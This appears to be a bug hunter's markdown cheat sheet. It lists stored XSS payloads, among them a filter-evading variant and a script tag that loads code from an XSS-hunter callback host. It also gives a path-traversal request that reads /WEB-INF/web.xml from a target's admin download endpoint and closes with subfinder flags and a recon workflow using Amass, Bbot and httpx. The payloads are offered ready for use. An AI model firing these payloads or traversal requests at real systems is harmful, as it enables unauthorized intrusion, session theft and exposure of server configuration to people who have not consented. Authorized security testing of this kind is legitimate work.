# Payload Stored XSS
#### <img src=x onerror​=alert(origin)>
#### <img src="X" onerror​=top[8680439..toString(30)](1337)>
#### test“;”/></{dynamic tag}></script><script/SRC=//{xss hunter url} /  (stored xss)
#### <script<img>>alert(1);</script</img>>

# Payload LFI
Since we are working in a Java environment, I attempted to read /WEB-INF/web.xml because this file often contains a lot of useful information. By navigating to http://admin.target:8443/admin/download?fileName=/WEB-INF/web.xml, I was able to access some juicy information.! https://medium.com/@HX007/a-journey-of-limited-path-traversal-to-rce-with-40-000-bounty-fc63c89576ea


---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# subdomain finder

#### subfinder -d yourdomain_name -v  
      -d = particular one domain enumurate <br>
      -dl = Maltipull domain enumurate from a file <br>
      -o, -output string = file to write output to <br>
      -silent = show only subdomains name in output <br>
      -nW, -active = display active subdomains only <br>
      -oI, -ip = include IP address and domain name in output (-active only) <br>
      -max-time int = minutes to wait for enumeration results (default 10) <br>
      -ei, -exclude-ip = exclude IPs from the list of domains <br>


 go-to tools 
#Subfinder, 
#Amass, 
#Bbot 
to gather subdomains.
==================================================
 filtered the live ones with #httpx.

using the 
#"-sc — title" 
flags because they show the status code and page title, which helps me spot interesting subdomains faster. 
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
